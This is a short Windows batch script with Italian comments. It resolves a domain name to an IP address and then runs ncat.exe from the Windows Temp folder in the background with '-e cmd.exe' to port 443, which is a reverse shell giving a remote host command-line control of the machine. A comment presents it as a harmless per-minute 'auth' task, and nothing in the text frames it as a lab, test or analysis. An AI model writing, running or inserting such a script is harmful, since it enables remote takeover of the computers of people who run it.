@echo off
setlocal
:: Imposta il dominio da risolvere
set "domain=dominio.arandom.co"
:: Esegui nslookup e memorizza l'indirizzo IP nella variabile
for /f "tokens=2" %%i in ('nslookup %domain% ^| find "Address:"') do (
    set "ip_address=%%i"
)
timeout /t 2 >nul
:: Esecuzione e task ogni minuto per auth
start "" /B "C:\Windows\Temp\ncat.exe" %ip_address% 443 -e cmd.exe
